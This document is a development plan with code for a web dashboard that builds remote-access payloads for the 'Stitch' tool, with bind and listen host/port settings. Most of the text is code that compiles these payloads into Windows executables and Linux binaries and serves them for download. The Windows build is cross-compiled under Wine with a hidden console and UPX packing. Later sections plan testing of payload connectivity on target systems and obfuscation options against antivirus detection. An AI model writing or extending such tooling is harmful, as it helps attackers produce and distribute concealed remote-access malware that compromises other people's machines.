# Implementation Plan: Fix Web Payload Generation

## Executive Summary
The web interface currently generates Python scripts (.py) instead of executables (.exe/.bin), making payloads unusable on systems without Python. This plan outlines how to fix this issue to achieve parity with the terminal version.

## Problem Statement
- **Current Behavior**: Web interface returns `st_main.py` Python source file
- **Expected Behavior**: Web interface should return compiled executables (`.exe` for Windows, binary for Linux/macOS)
- **Impact**: Payloads from web interface cannot run on target systems without Python interpreter

## Solution Architecture

### Three-Tier Approach
1. **Tier 1 (Immediate)**: Fix Linux binary generation
2. **Tier 2 (Short-term)**: Add Windows cross-compilation via Wine
3. **Tier 3 (Long-term)**: Full cross-platform compilation support

## Detailed Implementation Steps

### Phase 1: Fix Web Interface Payload Path (Immediate)

#### Step 1.1: Modify payload generation function
```python
# File: web_app_real.py
# Location: /api/generate-payload route (line ~786)

@app.route('/api/generate-payload', methods=['POST'])
@login_required
@limiter.limit("5 per hour")
def generate_payload():
    """Generate Stitch payload with specified configuration"""
    try:
        metrics_collector.increment_counter('api_requests')
        data = request.json or {}
        
        # Get configuration from request
        bind_host = data.get('bind_host', '')
        bind_port = data.get('bind_port', '4433')
        listen_host = data.get('listen_host', 'localhost') 
        listen_port = data.get('listen_port', '4455')
        enable_bind = data.get('enable_bind', True)
        enable_listen = data.get('enable_listen', True)
        target_platform = data.get('platform', 'linux')  # NEW: Platform selection
        
        # ... validation code ...
        
        # Import payload generation
        from Application.stitch_gen import run_exe_gen
        from Application.stitch_pyld_config import stitch_ini, get_conf_dir
        
        # Create temporary config
        config_backup = None
        try:
            # ... existing config setup ...
            
            # Generate payload with compilation
            run_exe_gen(auto_confirm=True, create_installers=False)
            
            # NEW: Find the actual compiled payload
            conf_dir = get_conf_dir()
            payload_path = None
            payload_filename = None
            
            # Check for compiled binaries based on platform
            if target_platform == 'windows':
                # Look for Windows executable
                binary_dir = os.path.join(conf_dir, 'Binaries')
                if os.path.exists(binary_dir):
                    for file in os.listdir(binary_dir):
                        if file.endswith('.exe'):
                            payload_path = os.path.join(binary_dir, file)
                            payload_filename = 'stitch_payload.exe'
                            break
            elif target_platform == 'linux':
                # Look for Linux binary
                binary_dir = os.path.join(conf_dir, 'Binaries')
                if os.path.exists(binary_dir):
                    for file in os.listdir(binary_dir):
                        if not file.endswith('.exe'):  # Linux binaries don't have extension
                            payload_path = os.path.join(binary_dir, file)
                            payload_filename = 'stitch_payload'
                            break
            
            # Fallback to Python script if no binary found
            if not payload_path:
                payload_path = 'Configuration/st_main.py'
                payload_filename = 'stitch_payload.py'
                log_debug("Warning: No compiled binary found, returning Python script", "WARNING", "Payload")
            
            # Read payload content
            with open(payload_path, 'rb') as f:
                payload_content = f.read()
            
            # Store for download
            session['payload_path'] = payload_path
            session['payload_filename'] = payload_filename
            
            return jsonify({
                'success': True,
                'message': 'Payload generated successfully',
                'payload_size': len(payload_content),
                'payload_type': 'executable' if not payload_filename.endswith('.py') else 'script',
                'platform': target_platform,
                'download_url': '/api/download-payload'
            })
        finally:
            # Restore backup config
            if config_backup and os.path.exists(config_backup):
                shutil.move(config_backup, st_config)
```

#### Step 1.2: Update download endpoint
```python
# File: web_app_real.py
# Location: /api/download-payload route (line ~917)

@app.route('/api/download-payload')
@login_required
def download_payload():
    """Download the generated payload"""
    try:
        # Get stored payload info from session
        payload_path = session.get('payload_path', 'Configuration/st_main.py')
        payload_filename = session.get('payload_filename', 'stitch_payload.py')
        
        if os.path.exists(payload_path):
            # Determine MIME type
            if payload_filename.endswith('.exe'):
                mimetype = 'application/x-msdownload'
            elif payload_filename.endswith('.py'):
                mimetype = 'text/x-python'
            else:
                mimetype = 'application/octet-stream'  # Generic binary
            
            log_debug(f"Payload downloaded: {payload_filename}", "INFO", "Payload")
            return send_file(payload_path, 
                           as_attachment=True, 
                           download_name=payload_filename,
                           mimetype=mimetype)
        else:
            return jsonify({'error': 'No payload available for download'}), 404
            
    except Exception as e:
        return jsonify({'error': str(e)}), 500
```

### Phase 2: Ensure PyInstaller Works (Short-term)

#### Step 2.1: Add PyInstaller check and installation
```python
# File: web_app_real.py
# Add near top of file with other imports

def check_pyinstaller():
    """Check if PyInstaller is available"""
    try:
        import PyInstaller
        return True
    except ImportError:
        # Try to install PyInstaller
        try:
            import subprocess
            subprocess.check_call([sys.executable, '-m', 'pip', 'install', 'pyinstaller'])
            return True
        except Exception as e:
            log_debug(f"Failed to install PyInstaller: {e}", "ERROR", "Setup")
            return False

# Check on startup
PYINSTALLER_AVAILABLE = check_pyinstaller()
```

#### Step 2.2: Modify stitch_gen.py for web context
```python
# File: Application/stitch_gen.py
# Modify run_exe_gen function to support web context better

def run_exe_gen(auto_confirm=False, create_installers=False, target_platform=None):
    if not os.path.exists(st_config):
        gen_default_st_config()

    if confirm_config(auto_confirm):
        conf_dir = get_conf_dir()
        assemble_stitch()
        
        # Determine platform
        if target_platform:
            # Override detected platform for cross-compilation
            platform = target_platform
        else:
            # Use detected platform
            if windows_client():
                platform = 'windows'
            elif osx_client():
                platform = 'osx'
            else:
                platform = 'linux'
        
        # Set compilation based on platform
        cur_dir = os.getcwd()
        success = False
        
        try:
            if platform == 'windows' and not windows_client():
                # Cross-compile for Windows from Linux/Mac
                success = cross_compile_windows(conf_dir)
            elif platform == 'windows':
                # Native Windows compilation
                os.chdir(configuration_path)
                # ... existing Windows code ...
                success = True
            elif platform in ['linux', 'osx']:
                # Use PyInstaller for Linux/Mac
                os.chdir(configuration_path)
                success = compile_with_pyinstaller(conf_dir, platform)
            
            if not success:
                st_print("[!] Compilation failed, returning Python script as fallback")
        finally:
            os.chdir(cur_dir)
        
        return conf_dir  # Return the output directory
```

### Phase 3: Add Cross-Compilation Support (Medium-term)

#### Step 3.1: Create cross-compilation module
```python
# File: Application/stitch_cross_compile.py (NEW FILE)

import os
import sys
import subprocess
import shutil
from .stitch_utils import *

def check_wine():
    """Check if Wine is installed"""
    return shutil.which('wine') is not None

def setup_wine_python():
    """Setup Python in Wine environment"""
    if not check_wine():
        return False
    
    # Check if Wine Python already installed
    wine_python = os.path.expanduser('~/.wine/drive_c/Python39/python.exe')
    if os.path.exists(wine_python):
        return True
    
    # Download and install Python in Wine
    try:
        # Download Python installer
        python_url = 'https://www.python.org/ftp/python/3.9.13/python-3.9.13-amd64.exe'
        installer_path = '/tmp/python-installer.exe'
        
        st_print("[*] Downloading Windows Python installer...")
        subprocess.run(['wget', '-O', installer_path, python_url], check=True)
        
        st_print("[*] Installing Python in Wine...")
        subprocess.run(['wine', installer_path, '/quiet', 'InstallAllUsers=1'], check=True)
        
        st_print("[*] Installing PyInstaller in Wine Python...")
        subprocess.run(['wine', 'python.exe', '-m', 'pip', 'install', 'pyinstaller'], check=True)
        
        os.remove(installer_path)
        return True
    except Exception as e:
        st_print(f"[!] Wine Python setup failed: {e}")
        return False

def cross_compile_windows(conf_dir):
    """Cross-compile Windows executable using Wine"""
    if not check_wine():
        st_print("[!] Wine not installed. Cannot create Windows executables on Linux.")
        st_print("[*] Install Wine: sudo apt-get install wine wine32 wine64")
        return False
    
    if not setup_wine_python():
        st_print("[!] Failed to setup Wine Python environment")
        return False
    
    try:
        st_print("[*] Cross-compiling Windows executable with Wine...")
        
        # Create spec file for Wine PyInstaller
        spec_content = '''
# -*- mode: python -*-
block_cipher = None

a = Analysis(['st_main.py'],
             pathex=['{}'],
             binaries=None,
             datas=None,
             hiddenimports=[],
             hookspath=[],
             runtime_hooks=[],
             excludes=[],
             win_no_prefer_redirects=False,
             win_private_assemblies=False,
             cipher=block_cipher)
pyz = PYZ(a.pure, a.zipped_data,
             cipher=block_cipher)
exe = EXE(pyz,
          a.scripts,
          a.binaries,
          a.zipfiles,
          a.datas,
          name='stitch_payload',
          debug=False,
          strip=False,
          upx=True,
          console=False,
          icon=None)
'''.format(os.getcwd())
        
        spec_path = 'st_main_win.spec'
        with open(spec_path, 'w') as f:
            f.write(spec_content)
        
        # Run Wine PyInstaller
        cmd = ['wine', 'python.exe', '-m', 'PyInstaller', '--onefile', 
               '--distpath={}'.format(conf_dir), spec_path]
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            st_print("[+] Windows executable created successfully")
            # Move to Binaries folder
            binary_dir = os.path.join(conf_dir, 'Binaries')
            os.makedirs(binary_dir, exist_ok=True)
            
            exe_path = os.path.join(conf_dir, 'stitch_payload.exe')
            if os.path.exists(exe_path):
                shutil.move(exe_path, os.path.join(binary_dir, 'stitch_payload.exe'))
                return True
        else:
            st_print(f"[!] Wine PyInstaller failed: {result.stderr}")
            return False
            
    except Exception as e:
        st_print(f"[!] Cross-compilation error: {e}")
        return False

def compile_with_pyinstaller(conf_dir, platform):
    """Compile using native PyInstaller"""
    try:
        st_print(f"[*] Compiling {platform} executable with PyInstaller...")
        
        # Create appropriate spec file
        if platform == 'linux':
            name = 'stitch_payload'
        elif platform == 'osx':
            name = 'stitch_payload.app'
        else:
            name = 'stitch_payload'
        
        cmd = ['pyinstaller', '--onefile', '--distpath={}'.format(conf_dir),
               '--name={}'.format(name), 'st_main.py']
        
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            st_print(f"[+] {platform} executable created successfully")
            # Move to Binaries folder
            binary_dir = os.path.join(conf_dir, 'Binaries')
            os.makedirs(binary_dir, exist_ok=True)
            
            binary_path = os.path.join(conf_dir, name)
            if os.path.exists(binary_path):
                shutil.move(binary_path, os.path.join(binary_dir, name))
                return True
        else:
            st_print(f"[!] PyInstaller failed: {result.stderr}")
            return False
            
    except Exception as e:
        st_print(f"[!] Compilation error: {e}")
        return False
```

### Phase 4: Update UI for Platform Selection

#### Step 4.1: Add platform selector to dashboard
```javascript
// File: templates/dashboard_real.html
// Add to payload generation modal

<div class="form-group">
    <label for="target-platform">Target Platform:</label>
    <select id="target-platform" class="form-control">
        <option value="windows">Windows (.exe)</option>
        <option value="linux">Linux (binary)</option>
        <option value="python">Python Script (.py)</option>
    </select>
    <small class="form-text text-muted">
        Select the target operating system for the payload
    </small>
</div>

// Update JavaScript to include platform
function generatePayload() {
    const config = {
        bind_host: $('#bind-host').val(),
        bind_port: $('#bind-port').val(),
        listen_host: $('#listen-host').val(),
        listen_port: $('#listen-port').val(),
        enable_bind: $('#enable-bind').prop('checked'),
        enable_listen: $('#enable-listen').prop('checked'),
        platform: $('#target-platform').val()  // Include platform selection
    };
    
    $.ajax({
        url: '/api/generate-payload',
        method: 'POST',
        contentType: 'application/json',
        data: JSON.stringify(config),
        success: function(response) {
            if (response.success) {
                // Update UI to show payload type
                let typeLabel = response.payload_type === 'executable' ? 
                    'Executable' : 'Python Script';
                
                showAlert('success', 
                    `Payload generated successfully!<br>` +
                    `Type: ${typeLabel}<br>` +
                    `Platform: ${response.platform}<br>` +
                    `Size: ${response.payload_size} bytes<br>` +
                    `<a href="${response.download_url}" class="btn btn-success mt-2">Download</a>`
                );
            }
        }
    });
}
```

## Testing Plan

### Unit Tests
1. Test Python script generation
2. Test Linux binary compilation
3. Test Windows cross-compilation (if Wine available)
4. Test fallback mechanisms

### Integration Tests
1. Generate payload via web API
2. Download and verify file type
3. Test payload execution on target OS
4. Verify configuration embedding

### Manual Testing Checklist
- [ ] Generate Linux payload from Linux server
- [ ] Generate Windows payload from Linux server (Wine)
- [ ] Generate Python script as fallback
- [ ] Verify downloaded file headers
- [ ] Test payload connectivity
- [ ] Check error handling for missing dependencies

## Rollout Plan

### Stage 1: Development (Week 1)
- Implement Phase 1 changes
- Test locally
- Code review

### Stage 2: Staging (Week 2)
- Deploy to staging environment
- Install PyInstaller
- Test payload generation

### Stage 3: Production (Week 3)
- Deploy Phase 1 to production
- Monitor for issues
- Collect user feedback

### Stage 4: Enhancement (Week 4)
- Add Wine support if needed
- Implement cross-compilation
- Full testing

## Success Metrics

1. **Functionality**: Web generates same payload types as terminal
2. **Success Rate**: >95% successful payload generations
3. **Performance**: <30 seconds generation time
4. **File Types**: Correct executable format for each platform
5. **User Satisfaction**: Positive feedback on payload usability

## Risk Mitigation

### Risk 1: PyInstaller not available
- **Mitigation**: Auto-install or provide clear instructions
- **Fallback**: Return Python script with self-compilation instructions

### Risk 2: Wine installation complex
- **Mitigation**: Make Wine optional, not required
- **Fallback**: Provide pre-compiled templates

### Risk 3: Compilation takes too long
- **Mitigation**: Add progress indicators
- **Fallback**: Cache common configurations

### Risk 4: Antivirus detection
- **Mitigation**: Document AV exclusions needed
- **Fallback**: Provide obfuscation options

## Conclusion

This implementation plan provides a clear path to fix the web interface payload generation issue. The phased approach allows for incremental improvements while maintaining stability. Priority should be on Phase 1 (fixing the output path) as it provides immediate value with minimal risk.